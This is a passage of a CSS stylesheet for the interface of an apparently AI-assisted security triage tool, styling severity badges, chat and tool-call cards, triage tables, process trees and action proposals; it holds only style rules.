small{font-size:9.5px;color:var(--ink-4);font-weight:500}.rad-score.crit{color:var(--red-d)}.rad-score.high{color:var(--amber)}.rad-arrow{display:inline-flex;align-items:center;color:var(--ink-4);transition:color .12s,transform .12s}\n.rad-when{flex:0 0 auto;align-self:flex-start;font-size:11.5px;color:var(--ink-4);white-space:nowrap}\n.rad-feat-when{color:var(--red-d);font-weight:500}.rad-item:hover .rad-arrow{color:var(--ink-1);transform:translate(1px,-1px)}.rad-feat-arrow{color:var(--red-d)}.rad-feat{flex-direction:column;align-items:stretch}.rad-feat-tagrow{display:flex;align-items:center;gap:9px;padding-bottom:12px;margin-bottom:13px;border-bottom:1px solid color-mix(in srgb, var(--red) 22%, transparent)}.rad-feat-tagrow .rad-feat-score{margin-left:auto}.rad-feat-main{display:flex;align-items:flex-start;gap:13px}.rad-feat-sev{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--red-d)}.rad-titlerow .rad-feat-title{margin-bottom:0}.rad-chips{display:flex;flex-wrap:wrap;gap:6px;margin:3px 0 9px}.rad-chip{font-size:11px;color:var(--ink-2);background:var(--panel);border:1px solid var(--line);border-radius:999px;padding:3px 10px}.rad-feat-right{flex-direction:column;align-items:flex-end;gap:10px}.rad-feat:hover .rad-feat-arrow{transform:translate(1px,-1px)}.rad-prio{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:4px 9px;border-radius:999px;flex:0 0 auto;display:inline-flex;align-items:center;gap:3px;white-space:nowrap;height:fit-content}.rad-prio.crit{background:var(--red-bg);color:var(--red-d)}.rad-prio.high{background:var(--amber-bg);color:var(--amber)}.rad-prio.low{background:var(--bg-2);color:var(--ink-3)}.rad-prio.done{background:transparent;color:var(--green);padding-left:0}.rad-item.done{background:transparent;border-color:transparent;padding:9px 15px;margin-bottom:1px}.rad-item.done .rad-ic{width:28px;height:28px;border-radius:8px}.rad-item.done .rad-ai{color:var(--ink-3);font-size:12.5px;margin-bottom:5px}.rad-item.done .rad-title{color:var(--ink-1);font-weight:500}.rad-item.done:hover{background:var(--panel);border-color:var(--line)}.radar-done-sec{opacity:.96}.rad-done{display:flex;align-items:center;gap:9px;padding:8px 10px;border-radius:var(--r-sm);cursor:pointer;transition:background .12s}.rad-done:hover{background:var(--bg-2)}.rad-done-ic{width:18px;height:18px;border-radius:50%;flex:0 0 auto;display:grid;place-items:center;background:var(--green-bg);color:var(--green)}.rad-done-t{font-size:13px;font-weight:500;color:var(--ink-2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-width:0}.rad-done .rad-id{flex:0 0 auto}.rad-done-when{margin-left:auto;font-size:11.5px;color:var(--ink-3);flex:0 0 auto}.rad-compact .rad-done-ic{background:color-mix(in srgb,var(--tc) 14%,transparent);color:var(--tc)}.rad-compact .rad-done-t{font-weight:600;color:var(--ink-0)}.rad-compact-tag{margin-left:auto;font-size:9.5px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:3px 9px;border-radius:999px;color:var(--ink-3);background:var(--bg-2);flex:0 0 auto}.rad-compact-tag.crit{color:var(--red-d);background:var(--red-bg)}.rad-compact-tag.high{color:var(--amber);background:var(--amber-bg)}.rad-compact-tag.low{color:var(--blue-d);background:var(--blue-bg)}.rad-compact .rad-done-when{margin-left:0}.rad-feat{border:1px solid rgba(196,46,58,.26);border-radius:var(--r-lg);background:linear-gradient(180deg,color-mix(in srgb,var(--red) 5%,var(--panel)),var(--panel));padding:18px;margin-bottom:9px;cursor:pointer;transition:box-shadow .13s;box-shadow:0 1px 3px rgba(196,46,58,.08)}.rad-feat:hover{border-color:rgba(196,46,58,.45);box-shadow:0 5px 18px rgba(196,46,58,.13)}.rad-feat-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:11px}.rad-feat-tag{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--red-d);background:var(--red-bg);padding:4px 10px;border-radius:999px}.rad-feat-score{font-family:var(--mono);font-size:22px;font-weight:700;color:var(--red-d);line-height:1}.rad-feat-score small{font-size:11px;color:var(--ink-3);font-weight:500}.rad-feat-titlerow{display:flex;align-items:center;gap:12px;margin-bottom:8px}.rad-feat-titlerow .rad-feat-title{margin-bottom:0}.rad-feat-title{font-size:16px;font-weight:700;letter-spacing:-.01em;color:var(--ink-0);margin-bottom:8px;line-height:1.3}.rad-feat-ai{font-size:13.5px;line-height:1.6;color:var(--ink-1);margin-bottom:15px}.rad-feat-ai b{color:var(--ink-0);font-weight:700}.rad-feat-ai code{font-family:var(--mono);font-size:12px;background:var(--bg-2);padding:1px 5px;border-radius:5px}.rad-feat-foot{display:flex;align-items:center;justify-content:space-between;gap:12px}.rad-feat-btn{display:inline-flex;align-items:center;gap:6px;font-size:12.5px;font-weight:600;color:#fff;background:var(--red-d);border:none;border-radius:var(--r-sm);padding:8px 14px;cursor:pointer;transition:.12s}.rad-feat-btn:hover{filter:brightness(.94)}.brief-page2{max-width:880px;margin:0 auto;padding:30px 28px 18px;width:100%}\n.bf-agent{display:flex;justify-content:center;margin-bottom:14px}\n.bf-bot{width:54px;height:54px;border-radius:16px;display:grid;place-items:center;color:#fff;box-shadow:var(--sh-sm)}\n.bf-bot.day{background:linear-gradient(135deg,var(--accent),var(--accent-d))}\n.bf-bot.night{background:linear-gradient(135deg,var(--accent),var(--accent-d))}\n.bf-head{text-align:center;font-size:25px;font-weight:700;letter-spacing:-.02em;color:var(--ink-0);margin:0 auto 22px;max-width:680px;line-height:1.25}\n.bf-statecard{border:1px solid var(--line);border-radius:var(--r-lg);background:var(--panel);padding:16px 18px;margin-bottom:16px}\n.bf-statecard-h{font-size:13px;font-weight:600;color:var(--ink-3);margin-bottom:12px}\n.bf-ents{display:grid;grid-template-columns:repeat(auto-fit,minmax(168px,1fr));gap:10px}\n.bf-ent{border:1px solid var(--accent-ring);background:var(--accent-bg);border-radius:var(--r-md);padding:11px 13px}\n.bf-ent-k{display:flex;align-items:center;gap:6px;font-size:11.5px;font-weight:600;color:var(--accent-d)}\n.bf-ent-k svg{color:var(--accent)}\n.bf-ent-v{display:block;margin-top:4px;font-size:14.5px;font-weight:700;color:var(--ink-0)}\n.bf-card{border:1px solid var(--line);border-radius:var(--r-lg);background:var(--panel);padding:14px;margin-bottom:16px}\n.bf-tabs{display:flex;align-items:center;gap:6px;margin-bottom:12px}\n.brief-tab{padding:7px 14px;border-radius:var(--r-sm);font-size:13px;font-weight:600;color:var(--ink-3);background:none;border:none;cursor:pointer;transition:.12s}\n.brief-tab:hover{background:var(--bg-2);color:var(--ink-1)}\n.brief-tab.on{background:var(--accent);color:var(--accent-on,#fff)}\n.bf-golink{margin-left:auto;display:inline-flex;align-items:center;gap:6px;font-size:12.5px;font-weight:600;color:var(--accent-d);cursor:pointer}\n.bf-golink svg{color:var(--accent)}\n.bf-risk{display:grid;grid-template-columns:repeat(4,1fr);border:1px solid var(--line);border-radius:var(--r-md);overflow:hidden;margin-bottom:12px}\n.bf-rt{padding:13px 15px;border-left:1px solid var(--line)}\n.bf-rt:first-child{border-left:none}\n.bf-rt-k{font-size:12px;font-weight:600;color:var(--ink-2);margin-bottom:7px}\n.bf-rt-v{display:flex;align-items:center;gap:7px;font-size:20px;font-weight:700;color:var(--ink-0);font-family:var(--mono)}\n.bf-rt.crit .bf-rt-v svg{color:var(--red)}\n.bf-rt.high .bf-rt-v svg{color:var(--amber)}\n.bf-feat{display:flex;align-items:center;gap:18px;border:1px solid var(--line);border-radius:var(--r-md);padding:16px 18px;margin-bottom:10px;cursor:pointer;transition:.12s}\n.bf-feat:hover{border-color:var(--line-strong);box-shadow:var(--sh-xs)}\n.bf-ring{flex:0 0 auto}\n.bf-feat-b{flex:1;min-width:0}\n.bf-feat-t{font-size:15px;font-weight:700;color:var(--ink-0);line-height:1.4}\n.bf-feat-chips{display:flex;flex-wrap:wrap;gap:7px;margin-top:10px}\n.bf-chip{display:inline-flex;align-items:center;gap:5px;font-size:11.5px;font-weight:600;color:var(--ink-2);border:1px solid var(--line);border-radius:var(--r-pill);padding:4px 10px}\n.bf-chip svg{color:var(--ink-4)}\n.bf-chip.esc{color:var(--accent-d);border-color:var(--accent-ring)}\n.bf-chip.esc svg{color:var(--accent)}\n.bf-list{border-top:1px solid var(--line)}\n.bf-row{display:flex;align-items:center;gap:12px;padding:12px 6px;border-bottom:1px solid var(--line);cursor:pointer;transition:.12s}\n.bf-row:hover{background:var(--bg-2)}\n.bf-row-ic{color:var(--accent);flex:0 0 auto}\n.bf-row-t{flex:1;min-width:0;font-size:13.5px;font-weight:600;color:var(--accent-d);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.bf-row-a{color:var(--ink-4);flex:0 0 auto;display:grid;place-items:center;width:24px;height:24px;border-radius:6px}\n.bf-row-a:hover{background:var(--line);color:var(--ink-2)}\n.bf-row-a.agent{color:var(--accent)}\n.sev{flex:0 0 auto;font-size:11px;font-weight:700;padding:3px 9px;border-radius:var(--r-pill)}\n.sev.crit{background:color-mix(in srgb,var(--red) 13%,transparent);color:var(--red-d)}\n.sev.high{background:color-mix(in srgb,var(--amber) 18%,transparent);color:color-mix(in srgb,var(--amber) 62%,#241500)}\n.sev.med{background:var(--blue-bg);color:var(--blue-d)}\n.sev.low{background:var(--bg-2);color:var(--ink-3)}\n.bf-empty{padding:18px 6px;font-size:12.5px;color:var(--ink-4)}\n.bf-prose{font-size:13.5px;line-height:1.6;color:var(--ink-2);margin-bottom:14px}\n.bf-actions{display:flex;gap:10px;margin-bottom:8px}\n.bf-act{display:inline-flex;align-items:center;gap:7px;padding:9px 16px;border-radius:var(--r-sm);font-size:13px;font-weight:600;border:1px solid var(--line-strong);background:var(--panel);color:var(--ink-1);cursor:pointer;transition:.12s}\n.bf-act:hover{background:var(--bg-2)}\n.bf-act.primary{background:var(--accent-bg);border-color:var(--accent-ring);color:var(--accent-d)}\n.bf-act.primary svg{color:var(--accent)}\n.bf-act.primary:hover{background:color-mix(in srgb,var(--accent) 15%,transparent)}\n.brief-composer{flex:0 0 auto;border-top:1px solid var(--line);padding:14px 28px 12px;background:var(--panel)}\n.bc-box{max-width:880px;margin:0 auto;display:flex;align-items:flex-end;gap:10px;border:2px solid var(--accent);border-radius:var(--r-md);padding:9px 9px 9px 14px;background:var(--bg)}\n.bc-box textarea{flex:1;border:none;background:none;outline:none;resize:none;font:inherit;font-size:14px;color:var(--ink-0);line-height:1.5;max-height:120px}\n.bc-box textarea::placeholder{color:var(--ink-4)}\n.bc-send{flex:0 0 auto;width:34px;height:34px;border-radius:var(--r-sm);background:var(--bg-2);border:1px solid var(--line-2);color:var(--ink-2);display:grid;place-items:center;cursor:pointer;transition:.12s}\n.bc-send:hover{background:var(--accent);border-color:var(--accent);color:var(--accent-on,#fff)}\n.bc-foot{max-width:880px;margin:9px auto 0;display:flex;align-items:center;gap:12px;font-size:12px}\n.bc-lbl{color:var(--ink-3)}\n.bc-chip{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:var(--accent-d);background:none;border:none;cursor:pointer;padding:0}\n.bc-chip:hover{text-decoration:underline}\n.bc-chip svg{color:var(--accent)}\n.brc{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);padding:13px 14px;margin-top:4px;max-width:560px}\n.brc-h{display:flex;align-items:center;gap:7px;font-size:13px;font-weight:700;color:var(--ink-0);margin-bottom:10px}\n.brc-h svg{color:var(--accent)}\n.brc-state{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}\n.brc-chip{display:inline-flex;align-items:center;gap:4px;font-size:10.5px;font-weight:600;color:var(--accent-d);background:var(--accent-bg);border:1px solid var(--accent-ring);border-radius:var(--r-pill);padding:3px 8px}\n.brc-chip svg{color:var(--accent)}\n.brc-risk{display:flex;gap:10px;margin-bottom:6px;flex-wrap:wrap}\n.brc-r{font-size:11px;font-weight:700;color:var(--ink-3)}\n.brc-r.crit{color:var(--red-d)}\n.brc-r.high{color:color-mix(in srgb,var(--amber) 62%,#241500)}\n.brc-ev{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:8px 0;border-top:1px solid var(--line);font-size:12.5px;color:var(--accent-d);cursor:pointer}\n.brc-ev:hover{color:var(--accent)}\n.brc-ev>span:first-child{display:flex;align-items:center;gap:6px;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600}\n.brc-ev .sev{font-size:10px;padding:2px 7px}\n.badge-ai{font-size:9px;font-weight:700;letter-spacing:.04em;color:var(--accent-d);background:var(--accent-bg);\n  border-radius:var(--r-pill);padding:1px 6px;text-transform:uppercase}\n\n/* THREAD COLUMN */\n.thread{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg);position:relative}\n\n/* spine header (appears on promotion) */\n.spine{flex:0 0 auto;background:var(--panel);border-bottom:1px solid var(--line);padding:0 14px;overflow:hidden;\n  max-height:0;opacity:0;transition:max-height .5s cubic-bezier(.2,.7,.2,1),opacity .4s;will-change:max-height}\n.spine.show{max-height:160px;opacity:1}\n.spine-in{padding:13px 0 14px;display:flex;flex-direction:column;gap:9px}\n.spine-row1{display:flex;align-items:center;gap:11px}\n.type-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:var(--r-sm);font-weight:600;font-size:11.5px;color:#fff}\n.spine h2{font-size:15px;font-weight:600;letter-spacing:-.01em;color:var(--ink-0);flex:1;min-width:0;\n  white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.spine-id{font-family:var(--mono);font-size:11px;color:var(--ink-3);background:var(--bg-2);padding:3px 8px;border-radius:var(--r-xs)}\n.spine-row2{display:flex;align-items:center;gap:8px;flex-wrap:wrap}\n.chip{display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 10px;border-radius:var(--r-sm);\n  font-size:11.5px;font-weight:500;background:var(--bg-2);color:var(--ink-2);border:1px solid var(--line)}\n.chip .dot{width:7px;height:7px;border-radius:50%}\n.chip.sev{font-weight:600}\n.chip.btn{cursor:pointer;transition:.13s}.chip.btn:hover{background:var(--panel);box-shadow:var(--sh-xs);border-color:var(--line-2)}\n.avatars{display:flex;align-items:center;margin-left:auto}\n.avatars .avatar{width:25px;height:25px;border:2px solid var(--panel);margin-left:-7px;font-size:10px;box-shadow:var(--sh-xs)}\n.avatars .avatar:first-child{margin-left:0}\n.pres{position:relative}\n.pres::after{content:\"\";position:absolute;right:-1px;bottom:-1px;width:8px;height:8px;border-radius:50%;border:2px solid var(--panel);background:var(--green)}\n.pres.idle::after{background:var(--amber)}\n.chat-head{flex-direction:row;align-items:center;gap:11px}\n.chat-title{font-size:15px;font-weight:600;letter-spacing:-.01em;color:var(--ink-0);flex:1;min-width:0;\n  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;border-radius:6px;padding:3px 7px;margin:-3px -7px;outline:none;\n  border:1px solid transparent;transition:background .12s,border-color .12s,box-shadow .12s;cursor:text}\n.chat-title:hover{background:var(--bg-2)}\n.chat-title:focus{background:var(--panel);border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-bg);overflow:visible;text-overflow:clip}\n.invite-btn{flex:0 0 auto;display:inline-flex;align-items:center;gap:6px;height:30px;padding:0 12px;border-radius:var(--r-sm);\n  font-size:11.5px;font-weight:600;background:var(--panel);color:var(--ink-1);border:1px solid var(--line-2);transition:.12s;cursor:pointer}\n.invite-btn:hover{border-color:var(--line-strong);background:var(--bg-2);color:var(--ink-0)}\n.invite-btn svg{color:var(--ink-3)}\n.pp-empty{font-size:11.5px;color:var(--ink-3);padding:10px 8px;text-align:center}\n\n/* chat scroll */\n.stream{flex:1;overflow-y:auto;padding:24px 0 18px}\n.stream-in{max-width:760px;margin:0 auto;padding:0 24px;display:flex;flex-direction:column;gap:18px}\n\n/* messages */\n.msg{display:flex;gap:12px;animation:rise .35s cubic-bezier(.2,.7,.2,1)}\n.msg .who{width:30px;height:30px;border-radius:9px;flex:0 0 auto;display:grid;place-items:center;color:#fff;margin-top:1px}\n.msg.user{flex-direction:row-reverse}\n.msg.user .bubble{background:var(--blue);color:#fff;border-radius:13px 13px 4px 13px;padding:10px 14px;max-width:78%;box-shadow:var(--sh-sm)}\n.msg.user .who{background:linear-gradient(135deg,#3a4150,#22262e)}\n.agent-who{background:linear-gradient(140deg,var(--accent),var(--accent-d));box-shadow:0 2px 8px var(--accent-ring);position:relative;overflow:hidden}\n.agent-who::after{content:\"\";position:absolute;inset:0;background:radial-gradient(circle at 32% 24%,rgba(255,255,255,.35),transparent 62%)}\n.msg.agent .body, .msg.system .body{flex:1;min-width:0;display:flex;flex-direction:column;gap:11px}\n.agent-name{display:flex;align-items:center;gap:7px;font-weight:600;font-size:12.5px;color:var(--ink-0);margin-bottom:-3px}\n.agent-name .tag{font-size:9.5px;font-weight:600;color:var(--accent-d);background:var(--accent-bg);padding:1px 6px;border-radius:var(--r-pill);letter-spacing:.03em}\n.prose{font-size:13.5px;color:var(--ink-1);line-height:1.6}\n.prose b{color:var(--ink-0);font-weight:600}\n.prose code{font-family:var(--mono);font-size:12px;background:var(--bg-2);padding:1px 5px;border-radius:4px;color:var(--ink-1)}\n.prose .flag{color:var(--red-d);font-weight:600}\n\n/* tool call card */\n.tool{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);overflow:hidden;box-shadow:var(--sh-xs)}\n.tool-h{display:flex;align-items:center;gap:9px;padding:9px 12px;background:var(--panel-2);border-bottom:1px solid var(--line);font-size:12px}\n.tool-h .ti{width:22px;height:22px;border-radius:6px;display:grid;place-items:center;background:var(--bg-2);color:var(--ink-2)}\n.tool-h .tl{font-weight:600;color:var(--ink-1)}\n.tool-h .auto{margin-left:auto;display:flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;color:var(--green);\n  background:var(--green-bg);padding:2px 8px;border-radius:var(--r-pill)}\n.tool-q{font-family:var(--mono);font-size:11.5px;color:var(--ink-2);padding:10px 12px;background:#fafbfd;\n  border-bottom:1px solid var(--line);white-space:pre-wrap;word-break:break-word;line-height:1.55}\n.tool-q .kw{color:var(--violet)} .tool-q .str{color:var(--green)} .tool-q .fn{color:var(--blue)}\n.tool-r{padding:11px 12px}\n.res-stat{display:flex;gap:10px;flex-wrap:wrap}\n.stat{flex:1;min-width:96px;background:var(--bg-2);border-radius:var(--r-sm);padding:9px 11px}\n.stat .v{font-size:18px;font-weight:700;color:var(--ink-0);letter-spacing:-.01em}\n.stat .v.red{color:var(--red-d)} .stat .v.amber{color:var(--amber)}\n.stat .k{font-size:11px;color:var(--ink-3);margin-top:1px}\ntable.res{width:100%;border-collapse:collapse;font-size:12px}\ntable.res th{text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:5px 8px;border-bottom:1px solid var(--line)}\ntable.res td{padding:6px 8px;border-bottom:1px solid var(--line);color:var(--ink-1)}\ntable.res tr:last-child td{border-bottom:none}\ntable.res td.mono{font-family:var(--mono);font-size:11px}\n.hostflag{display:inline-flex;align-items:center;gap:5px;color:var(--red-d);font-weight:600}\n.bar{height:6px;border-radius:3px;background:var(--bg-2);overflow:hidden;min-width:60px}\n.bar i{display:block;height:100%;background:var(--red);border-radius:3px}\n/* single-line tool result */\n.res-line{display:flex;align-items:flex-start;gap:8px;font-size:12px;line-height:1.45;color:var(--ink-1)}\n.res-line.ok{color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.res-line.ok svg{color:var(--green)}\n.res-line.crit{color:var(--red-d)}\n.res-line.crit svg{color:var(--red)}\n/* ---- triage queue table ---- */\n.tq{border:1px solid var(--line);border-radius:var(--r-md);overflow:hidden;background:var(--panel);box-shadow:var(--sh-xs);margin-bottom:4px}\n.tq-tbl{width:100%;border-collapse:collapse;font-size:12.5px}\n.tq-tbl th{text-align:left;font-weight:600;color:var(--ink-3);font-size:10px;text-transform:uppercase;letter-spacing:.05em;padding:8px 12px;background:var(--bg-2);border-bottom:1px solid var(--line)}\n.tq-tbl td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}\n.tq-tbl tbody tr:last-child td{border-bottom:none}\n.tq-row{cursor:pointer;transition:background .1s}\n.tq-row:hover{background:var(--bg-2)}\n.tq-rname{font-weight:600;color:var(--ink-0)}\n.tq-line{font-size:11px;color:var(--ink-3);margin-top:2px;line-height:1.4}\n.tq-host{color:var(--ink-2);white-space:nowrap}\n.tq-verdict{display:inline-block;font-size:10.5px;font-weight:700;padding:3px 8px;border-radius:var(--r-pill);white-space:nowrap}\n.tq-verdict.v-malicious{background:color-mix(in srgb,var(--red) 13%,transparent);color:var(--red-d)}\n.tq-verdict.v-suspicious{background:color-mix(in srgb,var(--amber) 18%,transparent);color:color-mix(in srgb,var(--amber) 62%,#241500)}\n.tq-verdict.v-benign{background:var(--bg-2);color:var(--ink-3)}\n.tq-verdict.v-contained{background:color-mix(in srgb,var(--green) 14%,transparent);color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n/* ---- case-created card (in chat) ---- */\n.ccard{display:flex;align-items:center;gap:12px;padding:12px 14px;margin-top:4px;border:1px solid var(--t-case);border-left:3px solid var(--t-case);border-radius:var(--r-md);background:color-mix(in srgb,var(--t-case) 6%,var(--panel));cursor:pointer;transition:.13s;box-shadow:var(--sh-xs)}\n.ccard:hover{background:color-mix(in srgb,var(--t-case) 11%,var(--panel));box-shadow:var(--sh-sm)}\n.cc-ic{flex:0 0 auto;width:34px;height:34px;border-radius:var(--r-sm);display:grid;place-items:center;background:var(--t-case);color:#fff}\n.cc-mid{flex:1;min-width:0}\n.cc-top{display:flex;align-items:center;gap:8px;margin-bottom:3px}\n.cc-flag{display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:700;color:color-mix(in srgb,var(--green) 70%,#0a2417)}\n.cc-flag svg{color:var(--green)}\n.cc-id{font-size:11px;color:var(--t-case);font-weight:600}\n.cc-title{font-size:13.5px;font-weight:600;color:var(--ink-0);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.cc-go{flex:0 0 auto;display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;color:var(--t-case)}\n/* ---- triage recap ---- */\n.trecap{border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);overflow:hidden;box-shadow:var(--sh-xs)}\n.tr-h{display:flex;align-items:center;gap:8px;padding:12px 14px 4px;font-size:14px;font-weight:700;color:var(--ink-0)}\n.tr-h svg{color:var(--green)}\n.tr-sub{padding:0 14px 12px;font-size:12px;color:var(--ink-3)}\n.tr-stats{display:flex;gap:8px;padding:0 14px 14px}\n.tr-stat{flex:1;background:var(--bg-2);border-radius:var(--r-sm);padding:10px 12px;text-align:center}\n.tr-stat .trv{font-size:20px;font-weight:700;color:var(--ink-0);line-height:1}\n.tr-stat .trk{font-size:10.5px;color:var(--ink-3);margin-top:4px}\n.tr-cases{border-top:1px solid var(--line);padding:8px}\n.tr-case{display:flex;align-items:center;gap:9px;padding:9px 8px;border-radius:var(--r-sm);cursor:pointer;transition:background .1s}\n.tr-case:hover{background:var(--bg-2)}\n.tr-case .tc-ic{flex:0 0 auto;width:24px;height:24px;border-radius:6px;display:grid;place-items:center;background:var(--t-case);color:#fff}\n.tr-case .tc-id{font-size:11px;color:var(--t-case);font-weight:600;flex:0 0 auto}\n.tr-case .tc-t{flex:1;min-width:0;font-size:12.5px;color:var(--ink-1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.tr-case .cc-go{color:var(--ink-4)}\n/* process tree */\n.ptree{font-family:var(--mono);font-size:11.5px;line-height:1.7;color:var(--ink-2)}\n.ptree .lvl{padding-left:18px;position:relative}\n.ptree .lvl::before{content:\"└─\";position:absolute;left:2px;color:var(--ink-4)}\n.ptree .danger{color:var(--red-d);font-weight:500}\n.ptree .ext{color:var(--violet)}\n\n/* proposal / diff card (the interface) */\n.proposal{border:1.5px solid var(--blue);border-radius:var(--r-lg);background:var(--panel);overflow:hidden;\n  box-shadow:0 8px 28px var(--blue-ring);animation:rise .4s cubic-bezier(.2,.7,.2,1)}\n.proposal.act{border-color:var(--amber);box-shadow:0 8px 28px rgba(192,130,15,.22)}\n.proposal.danger{border-color:var(--red);box-shadow:0 8px 28px rgba(196,46,58,.20)}\n.prop-h{display:flex;align-items:center;gap:10px;padding:12px 15px;border-bottom:1px solid var(--line);\n  background:linear-gradient(180deg,var(--blue-bg),transparent)}\n.proposal.act .prop-h{background:linear-gradient(180deg,var(--amber-bg),transparent)}\n.proposal.danger .prop-h{background:linear-gradient(180deg,var(--red-bg),transparent)}\n.prop-h .pic{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;color:#fff;background:var(--blue)}\n.proposal.act .prop-h .pic{background:var(--amber)} .proposal.danger .prop-h .pic{background:var(--red)}\n.prop-h .pt{font-weight:700;font-size:13.5px;color:var(--ink-0)}\n.prop-h .ps{font-size:11.5px;color:var(--ink-3);margin-top:1px}\n.prop-h .ribbon{margin-left:auto;font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;\n  color:var(--blue-d);background:var(--blue-bg);padding:3px 9px;border-radius:var(--r-pill)}\n.proposal.act .ribbon{color:var(--amber);background:var(--amber-bg)}\n.proposal.danger .ribbon{color:var(--red-d);background:var(--red-bg)}\n.prop-body{padding:14px 15px;display:flex;flex-direction:column;gap:13px}\n.field{display:flex;flex-direction:column;gap:5px}\n.field .fl{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);display:flex;align-items:center;gap:6px}\n.field .fl .add{color:var(--green);font-size:10px;background:var(--green-bg);padding:1px 6px;border-radius:var(--r-pill);font-weight:700;letter-spacing:0}\n.field .fv{font-size:13px;color:var(--ink-0);font-weight:500}\n.field .fv.title{font-size:14px;font-weight:600;line-height:1.4}\n.minitags{display:flex;gap:6px;flex-wrap:wrap}\n.mtag{font-size:11px;font-family:var(--mono);background:var(--bg-2);color:var(--ink-2);padding:3px 8px;border-radius:var(--r-xs);border:1px solid var(--line)}\n.mtag.sev-high{background:#fdeede;color:#b4640f;border-color:#f3d6a8;font-family:var(--sans);font-weight:600}\n/* evidence preview list inside proposal */\n.evlist{display:flex;flex-direction:column;gap:7px}\n.evrow{display:flex;gap:10px;padding:9px 10px;background:var(--bg-2);border-radius:var(--r-sm);border:1px solid var(--line);align-items:flex-start}\n.evrow .en{width:18px;height:18px;border-radius:5px;background:var(--blue);color:#fff;font-size:10px;font-weight:700;display:grid;place-items:center;flex:0 0 auto;margin-top:1px}\n.evrow .eb{flex:1;min-width:0}\n.evrow .et{font-size:12.5px;font-weight:600;color:var(--ink-0)}\n.evrow .ed{font-size:11.5px;color:var(--ink-2);margin-top:2px;line-height:1.45}\n.evrow .esrc{display:inline-flex;align-items:center;gap:5px;margin-top:5px;font-size:10.5px;color:var(--ink-3);\n  background:var(--panel);border:1px solid var(--line);border-radius:var(--r-pill);padding:2px 8px}\n.evrow .esrc .live{display:inline-flex;align-items:center;gap:4px;color:var(--green);font-weight:600}\n.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 var(--green);animation:pulse 2s infinite}\n\n/* timeline preview */\n.tl{display:flex;flex-direction:column;gap:0;position:relative;padding-left:6px}\n.tl-row{display:flex;gap:11px;padding:5px 0;position:relative}\n.tl-row::before{content:\"\";position:absolute;left:4px;top:0;bottom:0;width:1.5px;background:var(--line-2)}\n.tl-row:first-child::before{top:9px} .tl-row:last-child::before{bottom:calc(100% - 9px)}\n.tl-row .tdot{width:9px;height:9px;border-radius:50%;background:var(--ink-4);border:2px solid var(--panel);flex:0 0 auto;margin-top:4px;z-index:1;box-shadow:0 0 0 1px var(--line-2)}\n.tl-row.crit .tdot{background:var(--red)} .tl-row.act .tdot{background:var(--blue)} .tl-row.now .tdot{background:var(--green)}\n.tl-row .ttime{font-family:var(--mono);font-size:10.5px;color:var(--ink-3);width:66px;flex:0 0 auto;margin-top:3px}\n.tl-row .ttxt{font-size:12px;color:var(--ink-1);line-height:1.4}\n.tl-row .ttxt b{color:var(--ink-0)}\n\n/* buttons row */\n.prop-actions{display:flex;gap:9px;padding:13px 15px;border-top:1px solid var(--line);background:var(--panel-2)}\n.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;height:38px;padding:0 16px;border-radius:var(--r-sm);\n  font-weight:600;font-size:13px;transition:.15s;border:1px solid transparent}\n.btn.primary{background:var(--blue);color:#fff;box-shadow:var(--sh-sm)} .btn.primary:hover{background:var(--blue-d)}\n.btn.go{background:var(--green);color:#fff;box-shadow:var(--sh-sm)} .btn.go:hover{filter:brightness(.94)}\n.btn.warn{background:var(--amber);color:#fff;box-shadow:var(--sh-sm)} .btn.warn:hover{filter:brightness(.95)}\n.btn.danger{background:var(--red);color:#fff;box-shadow:var(--sh-sm)} .btn.danger:hover{background:var(--red-d)}\n.btn.ghost{background:var(--panel);border-color:var(--line-2);color:var(--ink-2)} .btn.ghost:hover{background:var(--bg-2)}\n.btn.sm{height:32px;padding:0 12px;font-size:12px}\n.btn .sp{flex:1}\n.allowrow{display:flex;align-items:center;gap:9px;padding:10px 15px;border-top:1px dashed var(--line);font-size:12px;color:var(--ink-2);background:var(--panel)}\n.allowrow .cb{width:17px;height:17px;border-radius:5px;border:1.5px solid var(--line-strong);display:grid;place-items:center;cursor:pointer;transition:.13s;flex:0 0 auto;color:transparent}\n.allowrow .cb.on{background:var(--blue);border-color:var(--blue);color:#fff}\n.allowrow b{color:var(--ink-0);font-weight:600}\n\n/* blast radius block */\n.blast{background:var(--bg-2);border-radius:var(--r-sm);padding:11px 12px;display:flex;flex-direction:column;gap:8px;border:1px solid var(--line)}\n.blast .br{display:flex;align-items:center;gap:9px;font-size:12px;color:var(--ink-1)}\n.blast .br 